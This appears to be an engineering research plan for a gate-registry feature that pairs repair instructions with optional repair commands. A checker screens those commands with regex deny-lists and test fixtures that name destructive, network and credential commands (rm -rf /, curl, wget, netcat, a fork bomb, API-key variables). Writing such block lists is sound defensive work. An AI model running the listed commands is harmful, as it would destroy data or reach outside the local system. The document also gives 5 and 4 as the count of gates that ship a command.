# Phase 33: Repair Instruction Contract - Research

**Researched:** 2026-04-27
**Domain:** gates registry contract extension; closed-vocabulary predicate validation
**Confidence:** HIGH (locked decision 33=C; 26.3 4-AND predicate frozen; all primary sources verified in repo)
**Controlling principle:** Autonomy continues; evidence tells the truth.

---

## User Constraints (from ROADMAP-AGENT.md + DISCUSS 2026-04-26)

### Locked Decisions

- **33=C** text + optional `repair_command:` (under 26.3 safety constraints).
  Text for humans, command for autonomous repair. (DISCUSS 2026-04-26 line 208.)
- **26.3 4-AND safety predicate** (DISCUSS line 170, frozen):
  `repair_command:` is allowed ONLY when ALL FOUR hold:
  1. `deterministic` - same input always produces same output (no time/random/network)
  2. `safe` - cannot mutate shared state outside the project working tree
  3. `local` - runs against local filesystem only (no curl/wget/ssh/HTTP)
  4. `auth-free` - requires no API keys, OAuth tokens, or credentials
  Disallowed examples (verbatim from DISCUSS): `git push`, `rm -rf`,
  `curl`/`wget`/HTTP calls, token-bearing commands, `--force` flags,
  destructive flags on shared files.
- **REPAIR-01..04** (REQUIREMENTS.md lines 34-37):
  - REPAIR-01: every blocking-gate row has `repair_instruction:` text
  - REPAIR-02: optional `repair_command:` allowed under 4-AND predicate
  - REPAIR-03: schema-load checker rejects `repair_command:` violating predicate
  - REPAIR-04: Mission Strip Q4 surfaces `repair_instruction`; milestone close
    lists unresolved repairs
- **Phase 31 envelope-v1 reason_codes are frozen** at
  `command-envelope-v1.yaml:204-212`:
  - `repair_instruction_only` (group: repair)
  - `repair_command_eligible` (group: repair)
  - `repair_command_rejected_by_4and` (group: repair)
  Reuse this vocabulary in checker output. Do NOT introduce new repair codes.
- **Acceptance commands** (ROADMAP line 327-330) - locked exact CLI shape:
  - `node super-gsd/scripts/lib/repair-command-checker.cjs --validate` returns 0
  - `grep -c "repair_instruction:" gates.yaml` >= 13
  - Test fixture with `repair_command: "rm -rf /"` is rejected
  - Test fixture with `repair_command: "node super-gsd/tools/system-map/generate.cjs"` is accepted
- **Hard stop only on the 5 conditions** (creds, destructive ops, privacy,
  runtime cannot continue, explicit operator gate). Validation failure is
  evidence, not a halt - 3 retries then backlog.

### Claude's Discretion

- Exact regex deny-list contents (frozen below in Section 4)
- Self-test assertion count (target 14)
- Whether validation hooks at gates.yaml load time vs separate `--validate`
  subcommand (recommendation: BOTH - module export AND CLI flag, mirroring
  `route-ledger.cjs` pattern at line 200-208)
- Mission Strip surfacing depth (recommendation: extend Q4 lane only when
  `repair_instruction` is reachable from a CRIT-BACKLOG row's `evidence_path`
  - cheapest viable wire-in)

### Deferred Ideas (OUT OF SCOPE)

- Auto-execution of `repair_command:` by the orchestrator (consumer is
  v1.8+; Phase 33 only ships SCHEMA + CHECKER + STATIC TEXT - the schema-
  load checker IS the consumer per Section 7 below)
- Renderer for repair status (`.md` view) - none in v1.7
- Per-gate retry budget tuning (gates already inherit 3-then-defer from
  DISCUSS Hard Bar)
- Soft-warn / amortized gate text (only blocking gates require text per
  REPAIR-01 - see Section 1 interpretation)
- Backporting `repair_instruction` to non-blocking gates as a precaution
  (resist scope creep; the schema accepts the field on any row, but only
  hard-halt rows are mandated)

---

## Phase Requirements

| ID | Description | Research Support |
|----|-------------|------------------|
| REPAIR-01 | Every blocking-gate row has `repair_instruction:` text | Section 1 (gate inventory) + Section 2 (proposed text per gate) |
| REPAIR-02 | Optional `repair_command:` allowed under 4-AND predicate | Section 3 (per-gate command analysis) + Section 4 (predicate impl) |
| REPAIR-03 | Schema-load checker rejects offending commands | Section 4 (regex deny-lists) + Section 5 (checker module) |
| REPAIR-04 | Mission Strip Q4 surfaces text; milestone close lists unresolved repairs | Section 6 (consumer paths - sgsd-mission-strip.ps1:251-284 + sgsd-complete-milestone SKILL.md Step 6) |

---

## Summary

Phase 33 is a **config + 1 lib + 2 thin consumer wires** phase. It edits the
13 gate rows in `super-gsd/registry/gates.yaml` to add a mandatory
`repair_instruction:` string and (where the 4-AND predicate holds) an
optional `repair_command:` string. It lands one new lib at
`super-gsd/scripts/lib/repair-command-checker.cjs` that exports a
`validateRepairCommands(parsedYaml)` function and a `--validate` CLI. It
hooks the validator into the existing `gates-registry.cjs` loader at line 53
(immediately after `_cache` assignment) so any malformed `repair_command:`
fails LOAD, not just an opt-in lint. It threads `repair_instruction` into
the Mission Strip Q4 lane via `crit-backlog.cjs`'s `evidence_path` (the
backlog row already references the gate; the checker writes the
`repair_instruction` into a new optional field on the unresolved row OR
the strip reads it directly from `gates.yaml` keyed on the gate name in the
backlog summary - recommendation Section 6: read directly from gates.yaml,
zero schema change to crit-backlog).

The checker mirrors the proven `route-ledger.cjs` shape: `validate` /
`readRows` / `selfTest` triad, frozen closed-enum violations, `--self-test`
exits 0 with 14 assertions, never throws upward at the production caller
boundary (logs to stderr and returns `{ok:false, violations:[...]}`).

**Of the 13 gates, 2 are `hard-halt`, 1 is `amortized`, 1 is `soft-warn` with
escalation to `hard-halt` on api_error, and 9 are pure `soft-warn`.**
REPAIR-01 says "every blocking-gate row" - the conservative reading
(recommended) is: `hard-halt` PLUS `amortized` PLUS the conditional-hard-halt
(`vtp-enrichment` with `escalation: block_on_api_error`). That gives 4
mandated rows. **However, 33=C "text for humans" benefits every gate
operator equally**, and adding `repair_instruction` to all 13 is cheap text +
clears the acceptance line `grep -c "repair_instruction:" gates.yaml >= 13`
which clearly anticipates 13. **Recommendation: write `repair_instruction:`
on all 13 rows.** Section 2 provides the text.

`repair_command:` is far stricter. Only **5 of 13** gates have a
deterministic, safe, local, auth-free command that meaningfully repairs
their failure mode. The other 8 fail the predicate (network, auth,
destructive, or non-deterministic) and ship `repair_instruction:` only.

**Primary recommendation:** ONE plan file. ~360 lines of code (lib +
self-test) + ~60 lines of yaml edits + ~10 lines of mission-strip
extension + ~10 lines added to sgsd-complete-milestone Step 6. Single
executor wave. Live-or-local: the checker's --self-test IS the production
caller path (gates-registry.cjs::loadGates at line 38 invokes it
indirectly through validateRepairCommands).

---

## Architectural Responsibility Map

| Capability | Primary Tier | Secondary Tier | Rationale |
|------------|-------------|----------------|-----------|
| Gate row schema (text + optional command) | registry/gates.yaml | - | Config; same file as gate definitions |
| 4-AND predicate validation | scripts/lib (Node CJS) | gates-registry.cjs | New lib; same dir as crit-backlog/route-ledger; integrates into loader |
| Mission Strip Q4 surfacing | scripts/lib/sgsd-mission-strip.ps1 | gates.yaml read | Extend existing line-4 blocker logic at lines 251-284 |
| Milestone-close unresolved-repairs list | skills/sgsd-complete-milestone/SKILL.md | crit-backlog.jsonl + gates.yaml | Step 6 SUMMARY-write extension |
| Repair fixtures (rm -rf rejected; system-map accepted) | tools/repair-command-checker/fixtures | - | Standard fixture pattern |

---

## Section 1: Gate Inventory (the 13 rows)

Verified by `grep -c "^  - name:" super-gsd/registry/gates.yaml` = 13.
Source: `super-gsd/registry/gates.yaml:33-253`.

| # | Gate name | Category | Step | enforcement_mode | escalation | Existing repair_instruction? | Mandated by REPAIR-01? |
|---|-----------|----------|------|------------------|------------|------------------------------|------------------------|
| 1 | `per-dispatch-ATC` | code-quality | 9.5 | hard-halt | halt | no | YES (hard-halt) |
| 2 | `phase-level-ATC` | code-quality | 6.5 | amortized | halt | no | YES (escalates on fire) |
| 3 | `classifier-haiku` | process-hygiene | 2 | soft-warn | log-only | no | recommended (logs only) |
| 4 | `context-selector-haiku` | process-hygiene | 4 | soft-warn | log-only | no | recommended |
| 5 | `sgsd-recall-queries` | process-hygiene | 5 | soft-warn | log-only | no | recommended |
| 6 | `intent-injection` | process-hygiene | 5.5 | soft-warn | log-only | no | recommended |
| 7 | `MUDA-waste-audit` | process-hygiene | 6.55 | soft-warn | log-only | no | recommended |
| 8 | `qualitative-waste-audit` | process-hygiene | 6.55 | soft-warn | log-only | no | recommended |
| 9 | `sgsd-curate-learnings` | process-hygiene | 10 | soft-warn | log-only | no | recommended |
| 10 | `token-log` | process-hygiene | 11 | soft-warn | log-only | no | recommended |
| 11 | `vtp-enrichment` | process-hygiene | 6.15 | soft-warn (CONDITIONAL hard-halt on api_error) | block_on_api_error | no | YES (conditional hard-halt) |
| 12 | `verifier-row-arithmetic` | verify-completeness | 0 | soft-warn | log-only | no | recommended |
| 13 | `verifier-detail-vs-summary` | verify-completeness | 0 | soft-warn | log-only | no | recommended |

**REPAIR-01 interpretation - LOCKED RECOMMENDATION**:

Strict reading: 4 gates qualify (#1, #2, #11; plus #2 is `amortized` with
`escalation: halt`, equivalent to blocking when it fires). REPAIR-01 text
says "every blocking-gate row" and the ROADMAP acceptance line says
`grep -c "repair_instruction:" gates.yaml >= 13`. The acceptance-count
test only passes when all 13 rows carry the field.

**Lock**: write `repair_instruction:` on all 13 rows. Treat the literal
acceptance test as the contract; the cost is text. This also ensures
when a soft-warn gate later escalates (DISCUSS allows mode promotion at
v1.8 review), the text is already in place.

---

## Section 2: Proposed `repair_instruction:` Text (all 13 gates, <=200 chars each)

Tone: terse, actionable, file-cited. Format: imperative verb + concrete
action + cite. Each line is YAML-safe (no unescaped colons inside the
string; quoted with double-quotes when ambiguity possible).

| # | Gate | Proposed `repair_instruction:` text |
|---|------|-------------------------------------|
| 1 | per-dispatch-ATC | "Read the latest commit-reviews.jsonl row in `.planning/phases/{N}/`, address the CRIT verdict, re-commit, and re-dispatch the executor to refire ATC." |
| 2 | phase-level-ATC | "Read `.planning/milestones/{ms}/phases/{NN}-*/{NN}-ATC-REVIEW.md`. Address each WARN/CRIT in a follow-up commit; re-run `gsd-verifier` to refire phase-level-ATC." |
| 3 | classifier-haiku | "Re-run the classifier dispatch with `Agent(model='haiku', task='classify')`; if Haiku is offline, fall back to a single-shot Sonnet classify and log DEVIATIONS." |
| 4 | context-selector-haiku | "Re-run the context-selector dispatch with `Agent(model='haiku', task='select_context')`; if empty, retry with broader recall query." |
| 5 | sgsd-recall-queries | "Run `bash super-gsd/scripts/sgsd-recall.sh '<query>'` for each recall term in the plan; if memory tree empty, mark dispatch as cold-start and continue." |
| 6 | intent-injection | "Re-compose the dispatch prompt and re-inject the intent block from the plan frontmatter; verify the agent received it via the dispatch report's INTENT echo." |
| 7 | MUDA-waste-audit | "Run `bash super-gsd/scripts/sgsd-muda-audit.sh --phase {N}` and address findings in `.planning/phases/{N}/WASTE.md`; rerun until WARN-or-PASS." |
| 8 | qualitative-waste-audit | "Re-dispatch sgsd-code-reviewer with `--qualitative-waste` against the latest WASTE.md; address findings in a follow-up commit." |
| 9 | sgsd-curate-learnings | "Run `bash super-gsd/scripts/sgsd-curate.sh` to write learnings under `.planning/memory/`; verify with `grep -r '<pattern>' .planning/memory/`." |
| 10 | token-log | "Append the missing token row to `.planning/metrics/token-log.jsonl` from the dispatch report; re-run `node super-gsd/tools/token-audit/check.cjs`." |
| 11 | vtp-enrichment | "Run `node super-gsd/scripts/lib/vtp-enrichment-gate.cjs --phase {N}`; if VTP api_error, fall back per fallback-chain (sgsd-memory) and log `provider_unavailable`." |
| 12 | verifier-row-arithmetic | "Open `.planning/phases/{N}/{N}-verify.mjs`, fix the row-count mismatch (expected vs actual), and re-run `node {N}-verify.mjs`." |
| 13 | verifier-detail-vs-summary | "Reconcile detail rows with the summary block in `{N}-VERIFICATION.md`; either expand the summary or delete the orphan detail rows; re-run verifier." |

All 13 are <=200 chars. All use canonical paths. None require external auth.

---

## Section 3: Proposed OPTIONAL `repair_command:` (only where 4-AND holds)

Each candidate is evaluated against ALL FOUR predicates. Failure of ANY
ONE = command must be omitted; only `repair_instruction:` ships.

| # | Gate | Candidate command | det? | safe? | local? | auth-free? | SHIP? |
|---|------|-------------------|------|-------|--------|------------|-------|
| 1 | per-dispatch-ATC | (none - reviewer dispatch needs Codex/Claude provider auth) | - | - | - | NO (needs CODEX_API_KEY or Claude auth) | OMIT |
| 2 | phase-level-ATC | (same as #1) | - | - | - | NO | OMIT |
| 3 | classifier-haiku | (Haiku dispatch needs Anthropic auth) | - | - | - | NO | OMIT |
| 4 | context-selector-haiku | (same as #3) | - | - | - | NO | OMIT |
| 5 | sgsd-recall-queries | `bash super-gsd/scripts/sgsd-recall.sh --self-test` | YES | YES (read-only) | YES | YES | **SHIP** |
| 6 | intent-injection | (re-composes a prompt; semantic op, no command repairs it) | - | - | - | - | OMIT |
| 7 | MUDA-waste-audit | `bash super-gsd/scripts/sgsd-muda-audit.sh --self-test` | YES | YES (writes only to fixture dir; --self-test guarded) | YES | YES | **SHIP** |
| 8 | qualitative-waste-audit | (qualitative review needs Codex/Claude auth) | - | - | - | NO | OMIT |
| 9 | sgsd-curate-learnings | `bash super-gsd/scripts/sgsd-curate.sh --dry-run` | YES | YES (dry-run only) | YES | YES | **SHIP** |
| 10 | token-log | `node super-gsd/tools/token-audit/check.cjs --dry-run` | YES | YES | YES | YES | **SHIP** |
| 11 | vtp-enrichment | (needs VTP MCP; network) | - | - | NO (network) | NO (auth) | OMIT |
| 12 | verifier-row-arithmetic | `node super-gsd/scripts/lib/repair-command-checker.cjs --self-test` (placeholder; the actual repair is editing verify.mjs which no command can do deterministically) | - | - | - | - | OMIT (semantic op) |
| 13 | verifier-detail-vs-summary | (same as #12; semantic reconciliation) | - | - | - | - | OMIT |

**Wait** - the acceptance line at ROADMAP:330 specifies:
`Test fixture with repair_command: "node super-gsd/tools/system-map/generate.cjs" is accepted`.

That command is from Phase 35. We must accept it as a fixture even though
Phase 35 hasn't shipped yet (the checker validates the COMMAND STRING for
4-AND compliance, not the file's existence). The acceptance test passes
because:
- `node` invocation: deterministic
- `super-gsd/tools/system-map/generate.cjs`: relative path, repo-local
- No auth, no network
**4-AND holds; checker accepts.**

The reciprocal acceptance test:
`Test fixture with repair_command: "rm -rf /"` MUST be rejected.
- `rm` matches deny-list (destructive verb)
- `-rf` matches deny-list (destructive flag combination)
- `/` matches deny-list (root path target)
**4-AND fails on `safe`; checker rejects.**

**Final tally: 4 gates ship `repair_command:`, 9 ship only
`repair_instruction:`. All 13 ship `repair_instruction:`.**

---

## Section 4: 4-AND Predicate Implementation (regex deny-lists)

The checker enforces the 4-AND predicate via 4 deny-lists, each scanning
the candidate `repair_command:` string. ANY match in ANY list = reject
that gate's command. Whitelist approach was considered and rejected:
the command grammar is too open (any node script, any bash script). A
deny-list of known-dangerous patterns is the operational fit, matching
how DISCUSS 26.3 enumerated disallowed shapes ("git push, rm -rf,
curl/wget/HTTP, token-bearing, --force, destructive on shared files").

### 4.1 `deterministic` deny-list (regex)

Reject commands that introduce non-determinism:

```javascript
const DETERMINISTIC_DENYLIST = [
  /\$\(date[^)]*\)/i,        // $(date), $(date +%s)
  /\$RANDOM\b/,                // $RANDOM
  /Date\.now\(\)/,             // Date.now()
  /Math\.random\(\)/,          // Math.random()
  /\bcurl\b/i,                 // curl (network = non-deterministic)
  /\bwget\b/i,                 // wget
  /\bgh\b\s+(?!auth\s+status)/, // gh fetches non-deterministic remote state
                                  //   (gh auth status is read-only check;
                                  //    everything else hits the network)
  /\bopenssl\s+rand\b/,        // openssl rand
  /\/dev\/(u?random)/,         // /dev/random, /dev/urandom
  /--seed=\$\(/,                // dynamic seed
];
```

### 4.2 `safe` deny-list (regex)

Reject commands that mutate shared state outside the working tree:

```javascript
const SAFE_DENYLIST = [
  /\brm\s+-r?f\b/,             // rm -rf, rm -f
  /\brm\s+-f?r\b/,             // rm -fr
  /\bDROP\s+TABLE\b/i,         // SQL DROP
  /\bDELETE\s+FROM\b/i,        // SQL DELETE
  /\bTRUNCATE\b/i,
  /\bgit\s+push\b/i,           // including --force (DISCUSS verbatim)
  /\bgit\s+reset\s+--hard\b/i,
  /\bgit\s+clean\s+-f/i,
  /\b--force\b/i,              // generic --force flag (DISCUSS verbatim)
  /\b-f\s+\//,                  // -f against absolute root path
  /\s>\s*\//,                   // redirect to absolute path
  /\s>>\s*\//,                  // append-redirect to absolute path
  /\bsudo\b/,                   // sudo escalates outside tree
  /\bchmod\s+(?:777|\+x\s+\/)/,// chmod 777, chmod +x against /
  /\bdd\s+if=/,                 // dd commands
  /\bmkfs\b/,                   // mkfs
  /\b:\(\)\s*\{\s*:\|/,         // fork bomb
];
```

### 4.3 `local` deny-list (regex)

Reject commands that touch the network or remote systems:

```javascript
const LOCAL_DENYLIST = [
  /\bcurl\b/i,
  /\bwget\b/i,
  /\bssh\b/i,
  /\bscp\b/i,
  /\brsync\s+[^\s]+:/,         // rsync host:path = remote
  /\bkubectl\b/i,
  /\bdocker\s+(push|pull|run\s+--network)/i,
  /\bgh\b\s+(?!auth\s+status)/, // gh almost always reaches remote
  /\baws\b\s+(?!sts\s+get-caller-identity)/i, // aws CLI is remote
  /\bhttps?:\/\//i,            // any URL literal
  /:\/\/[^\s\/]+/,              // generic protocol://host
  /\bnetcat\b|\bnc\b\s+-/,     // netcat probes
  /\bping\b/i,                  // ICMP
  /\bnpm\s+(install|publish|adduser)/,  // npm hits the registry
  /\bpip\s+(install|upload)/,
];
```

### 4.4 `auth-free` deny-list (regex)

Reject commands that reference credentials or auth flows:

```javascript
const AUTH_FREE_DENYLIST = [
  /\$OPENAI_API_KEY/,
  /\$CODEX_API_KEY/,
  /\$ANTHROPIC_API_KEY/,
  /\$GH_TOKEN\b/,
  /\$GITHUB_TOKEN/,
  /\$AWS_(ACCESS_KEY|SECRET)/,
  /\bgh\s+auth\b/,             // gh auth login/logout/refresh
  /\baws\s+sts\b/,
  /\bkubectl\s+(--token|--kubeconfig=\/)/,
  /\bvault\s+(login|read)/i,
  /\boauth\b/i,
  /\bbasic\s+auth\b/i,
  /\b--header\s+["']?Authorization/i,
  /\b-H\s+["']?Authorization/i,
];
```

### 4.5 Structured failure mode

When ANY predicate fails, the checker emits one violation row:

```javascript
{
  gate: "<gate name>",
  command: "<the offending repair_command string>",
  failed_predicates: ["safe"],            // array - may have multiple
  matches: [
    { predicate: "safe", pattern: "/\\brm\\s+-r?f\\b/", match: "rm -rf" }
  ],
  message: "gate '<name>' repair_command failed 4-AND predicate(s): safe (matched: 'rm -rf')"
}
```

The full result object:

```javascript
{
  ok: false,
  total_commands_checked: 4,
  total_violations: 1,
  violations: [ <violation rows> ]
}
```

`ok: true` <=> `violations.length === 0`.

`reason_code` mapping (envelope-v1 vocab from
`command-envelope-v1.yaml:204-212`):
- All-pass run -> `repair_command_eligible` (per ALL gates with command)
- All-fail or any-fail run -> `repair_command_rejected_by_4and`
- Gates with text only -> `repair_instruction_only`

---

## Section 5: Checker Module Design

**Path**: `super-gsd/scripts/lib/repair-command-checker.cjs`
**Pattern**: 1:1 mirror of `route-ledger.cjs:1-444` (verified line count).
**LOC budget**: ~360 lines (lib ~280 + self-test ~80).

### 5.1 Public API

```javascript
module.exports = {
  // Closed enums (frozen):
  PREDICATES,            // ['deterministic', 'safe', 'local', 'auth-free']
  DENYLISTS,             // { deterministic: [...], safe: [...], local: [...], auth_free: [...] }

  // Core API:
  validateRepairCommands,  // (parsedYaml) -> { ok, violations, total_commands_checked }
  validateOneCommand,      // (commandString) -> { ok, failed_predicates, matches }
  validateGatesYaml,       // (yamlPath) -> read+parse+validateRepairCommands

  // Schema enforcement:
  assertEveryBlockingGateHasInstruction, // (parsedYaml) -> { ok, missing }

  // CLI helpers (call when require.main === module):
  selfTest,                // -> exit code (0 = pass)
  validateCli,             // -> exit code (0 = pass) for --validate flag
};
```

### 5.2 CLI surface

```bash
# Validate the canonical gates.yaml (required by ROADMAP:328):
node super-gsd/scripts/lib/repair-command-checker.cjs --validate
# Exit 0 = all good. Exit 1 = at least one violation; prints structured JSON.

# Self-test (covers all 14 assertions; uses tmp fixtures):
node super-gsd/scripts/lib/repair-command-checker.cjs --self-test
# Exit 0 = pass.

# Validate an arbitrary file (used by gates-registry tests):
node super-gsd/scripts/lib/repair-command-checker.cjs --validate-file <path>
```

### 5.3 Integration with gates-registry.cjs

`gates-registry.cjs:38-55` shows the existing loader. Insertion point is
**inside loadGates(), after `_cache = { all, byName }`, before return**:

```javascript
// gates-registry.cjs line 53 (proposed addition):
_cache = { all, byName };

// REPAIR-03: validate every repair_command at LOAD time.
// On violation, throw - gates.yaml is malformed.
const repairChecker = require('./repair-command-checker.cjs');
const result = repairChecker.validateRepairCommands({ gates: all });
if (!result.ok) {
  const detail = result.violations.map(v => v.message).join('; ');
  throw new Error(`gates.yaml repair_command violations: ${detail}`);
}

return _cache;
```

**Why throw at load time?** A malformed `repair_command:` is a config bug,
not a runtime decision. The orchestrator should never start with a
poisoned registry. Mirrors how `route-ledger.cjs:97-104` throws on closed-
enum violations during `appendRow`.

**The instruction-presence check is informational, NOT a throw**:

```javascript
// gates-registry.cjs (proposed):
const presence = repairChecker.assertEveryBlockingGateHasInstruction({ gates: all });
if (!presence.ok) {
  console.warn(`[SGSD] gates.yaml: missing repair_instruction on: ${presence.missing.join(', ')}`);
}
```

This is a soft-warn (per DISCUSS Hard Bar - text omission is a fix-now
issue but not a halt). The acceptance command `grep -c repair_instruction
gates.yaml >= 13` is the hard check; the load-time warning is defensive.

### 5.4 --self-test scaffold (target: 14 assertions)

Mirrors `route-ledger.cjs:286-420` (the 12-assertion harness). Pattern:
isolated tmp dir, write fixture yaml strings, validate, assert outcomes.

| # | Assertion |
|---|-----------|
| 1 | `PREDICATES` is exactly `['deterministic','safe','local','auth-free']` (frozen) |
| 2 | `DENYLISTS` has all 4 keys, each is a non-empty array of RegExp |
| 3 | `validateOneCommand("node super-gsd/tools/system-map/generate.cjs")` -> `ok: true` (positive control - matches ROADMAP:330) |
| 4 | `validateOneCommand("rm -rf /")` -> `ok: false, failed_predicates: ['safe']` (matches ROADMAP:329) |
| 5 | `validateOneCommand("curl https://example.com")` -> `ok: false, failed_predicates: contains 'local'` |
| 6 | `validateOneCommand("gh auth login")` -> `ok: false, failed_predicates: contains 'auth-free'` |
| 7 | `validateOneCommand("npm install --force")` -> `ok: false, failed_predicates: contains 'safe' AND 'local'` (compound) |
| 8 | `validateOneCommand("date +%s")` -> `ok: false, failed_predicates: contains 'deterministic'` (date is non-det) |
| 9 | `validateRepairCommands({ gates: [{name:'g1', repair_command:'rm -rf /'}] })` -> 1 violation, gate name = 'g1' |
| 10 | `validateRepairCommands({ gates: [{name:'g1'}] })` -> ok (no command = no check) |
| 11 | `validateRepairCommands({ gates: [{name:'g1', repair_instruction:'fix it'}] })` -> ok (instruction-only is fine) |
| 12 | `assertEveryBlockingGateHasInstruction({ gates: [{name:'g1', enforcement_mode:'hard-halt'}] })` -> `ok: false, missing: ['g1']` |
| 13 | `assertEveryBlockingGateHasInstruction({ gates: [{name:'g1', enforcement_mode:'hard-halt', repair_instruction:'x'}] })` -> `ok: true` |
| 14 | `validateGatesYaml('super-gsd/registry/gates.yaml')` -> `ok: true` against the SHIPPED yaml (proves the repo's actual gates.yaml passes) |

Assertion 14 is the "live" check: it loads the canonical yaml and proves
it's compliant. This is the production caller path equivalent (mirrors
route-ledger.test.cjs:1-144 fingerprint pattern at lines 300-409).

### 5.5 Fingerprint guard (port from route-ledger.cjs:300-309)

Self-test must NOT mutate the canonical gates.yaml. Capture mtime/size
before, compare after, assert untouched. This is assertion 12 in
`route-ledger.cjs`; we port it as a 15th internal guard (not counted in
the 14 because it's a precondition, not a test of the lib's behavior).

---

## Section 6: Mission Strip + Milestone-Close Consumer Paths (REPAIR-04)

REPAIR-04 has TWO halves:
- (a) **Mission Strip Q4 surfaces `repair_instruction`**
- (b) **Milestone close lists unresolved repairs**

### 6.1 Mission Strip Q4 surfacing (super-gsd/scripts/lib/sgsd-mission-strip.ps1:251-284)

The current Q4 lane (line 251-284) reads CRIT-BACKLOG via
`crit-backlog.cjs::rowsForPhase` and renders:

```
> blocker blocked  $n open : $firstShort
```

`$firstShort` is the first row's `summary` truncated to 50 chars
(line 270). To surface `repair_instruction`, we have two options:

**Option A (RECOMMENDED)**: extend the node expression at line 259 to ALSO
look up the gate name from the row, fetch `repair_instruction` from
gates.yaml, and append it to the strip line. **Zero schema change** to
crit-backlog. Cost: ~10 lines in sgsd-mission-strip.ps1; ~10 lines in
crit-backlog.cjs to expose a helper `gateForRow(row)` that parses the
`evidence_path` for a gate name.

**Option B**: add a `repair_instruction` field to crit-backlog.jsonl
schema. Rejected: schema change requires versioning, the field belongs
to the gate not the backlog row, duplication invites drift.

Concrete diff (Option A) at sgsd-mission-strip.ps1:259:

```powershell
# Before:
$nodeExpr = "const m=require('$($cjsPath -replace '\\','/')'); const rows=m.rowsForPhase('$(($ProjectDir -replace '\\','/'))/.planning', '$($out.activePhase)'); console.log(JSON.stringify({n:rows.length, first: (rows[0] && rows[0].summary) || ''}));"

# After:
$gatesPath = (Join-Path $ProjectDir "super-gsd/registry/gates.yaml") -replace '\\','/'
$nodeExpr = "const m=require('$($cjsPath -replace '\\','/')'); const rc=require('$($gatesPath -replace 'gates\.yaml','scripts/lib/repair-command-checker.cjs')'); const rows=m.rowsForPhase('$(($ProjectDir -replace '\\','/'))/.planning', '$($out.activePhase)'); const r=rows[0]; const repair = r ? rc.repairInstructionForBacklogRow(r,'$gatesPath') : ''; console.log(JSON.stringify({n:rows.length, first: (r && r.summary) || '', repair}));"
```

Then line 270 becomes:

```powershell
$repairShort = _Truncate-Ascii "$($bl.repair)" 60
$out.blocker = "> blocker blocked  $n open : $firstShort | repair: $repairShort"
```

The new helper `repairInstructionForBacklogRow(row, gatesPath)` lives in
the new `repair-command-checker.cjs` module:
1. Parse `row.evidence_path` for tokens like `gate=<name>` or
   `phases/{N}/commit-reviews.jsonl` (the latter implies per-dispatch-ATC).
2. Look up the gate name in gates.yaml via the existing
   `gates-registry.cjs::getGate`.
3. Return `gate.repair_instruction || ''`.

### 6.2 Milestone-close unresolved-repairs list (sgsd-complete-milestone Step 6)

The skill at `super-gsd/skills/sgsd-complete-milestone/SKILL.md:103-114`
generates SUMMARY.md. Step 6 enumerates "shipped phases / evidence /
rules learned / governance findings / next-milestone seed".

REPAIR-04(b) requires unresolved repairs surfaced. Concrete addition to
Step 6's SUMMARY.md template:

```markdown
## Unresolved Repairs

(Generated by sgsd-complete-milestone Step 6. Reads CRIT-BACKLOG rows
for this milestone, joins to gates.yaml `repair_instruction:`, lists.)

| backlog id | gate | summary | repair_instruction |
|---|---|---|---|
| <id> | <gate name> | <truncated summary> | <repair_instruction> |

(Rows where `kind != 'cleared'` AND `tagged_for_milestone == {{version}}`.)

If no rows: write `(no unresolved repairs for this milestone)`.
```

Implementation cost: ~10 lines added to Step 6 of SKILL.md, plus a
~15-line node helper in `repair-command-checker.cjs`:
`unresolvedRepairsForMilestone(planningDir, milestone, gatesPath)`.

The helper reuses:
- `crit-backlog.cjs::rowsForMilestone(planningDir, milestone)` (line 139)
- `gates-registry.cjs::getGate(name, gatesYamlPath)` (line 65)

No new I/O paths. No new schema.

### 6.3 Surfacing summary

| Consumer | File | Lines added | New behavior |
|----------|------|-------------|--------------|
| Mission Strip Q4 | sgsd-mission-strip.ps1:259-271 | ~10 | Append `\| repair: <text>` to blocker line when applicable |
| Milestone close Step 6 | sgsd-complete-milestone/SKILL.md:103-114 | ~10 | Append "## Unresolved Repairs" section to SUMMARY.md template |
| Helper API | repair-command-checker.cjs | ~30 (in lib) | `repairInstructionForBacklogRow`, `unresolvedRepairsForMilestone` |

---

## Section 7: Schema-Without-Consumer Satisfaction Analysis

DISCUSS Patch (rule from Phase 32 analogy) requires every schema phase
land at least one production consumer. Phase 33's consumer story:

| Schema element | Consumer in Phase 33 | Path |
|----------------|---------------------|------|
| `repair_instruction:` (config) | gates-registry.cjs load-time warning + Mission Strip Q4 + milestone-close SUMMARY | sgsd-mission-strip.ps1:251-284 (extended) + SKILL.md Step 6 (extended) |
| `repair_command:` (config) | repair-command-checker.cjs validateRepairCommands fired at gates-registry.cjs:53 (extended) | The CHECKER IS THE CONSUMER. Schema-load validation = production caller. |
| 4-AND predicate (lib) | gates-registry.cjs::loadGates throws if violation | gates-registry.cjs:38-55 (extended) |
| Mission Strip Q4 surfacing | Mission Strip already runs every refresh tick on the live cockpit | Production caller already exists. |

**All three contracts ship a real consumer in Phase 33.** None deferred to
v1.8+. The orchestrator does NOT yet AUTO-EXECUTE `repair_command:` - that
is correctly deferred (the schema/checker exists; auto-execution is a
separate v1.8+ decision the operator must opt into). DISCUSS doesn't
require auto-execution; it requires the SCHEMA + CHECKER, both of which
ship here.

**Rule satisfied**: every schema element has at least one in-phase consumer.

---

## Section 8: Open Derivation Calls + Locked Recommendations

| # | Question | Locked recommendation | Rationale |
|---|----------|----------------------|-----------|
| 1 | Apply `repair_instruction:` to all 13 gates or only blocking? | All 13 | ROADMAP:329 acceptance test `grep -c >= 13` is the literal contract; cost is ASCII text; future mode promotion has text in place |
| 2 | Validate at load time vs separate `--validate` only? | BOTH (load-time throw + CLI flag) | Mirrors route-ledger.cjs (lib + CLI); fail-fast on poisoned registry |
| 3 | Whitelist or deny-list for predicate? | Deny-list | DISCUSS 26.3 enumerated disallowed shapes; whitelist would over-restrict and require constant additions |
| 4 | Add `repair_instruction` to crit-backlog schema or read from gates.yaml? | Read from gates.yaml | Single source of truth; field belongs to gate, not the backlog row |
| 5 | Reuse envelope-v1 reason_codes or invent new? | Reuse (3 codes already declared at command-envelope-v1.yaml:204-212) | Phase 31 pre-declared `repair_*` codes for exactly this phase |
| 6 | Mission Strip - extend Q4 line or add a 7th line? | Extend Q4 (one-line `\| repair:` suffix) | 28.2 locked 6 lines; new line = contract violation |
| 7 | Auto-execute `repair_command:` in this phase? | NO (defer to v1.8+) | Not in REPAIR-01..04 scope; DISCUSS only mandates SCHEMA + CHECKER |
| 8 | Self-test assertion count? | 14 (12 from route-ledger pattern + 2 for assertEveryBlockingGateHasInstruction) | Coverage of all branches; matches route-ledger precedent |
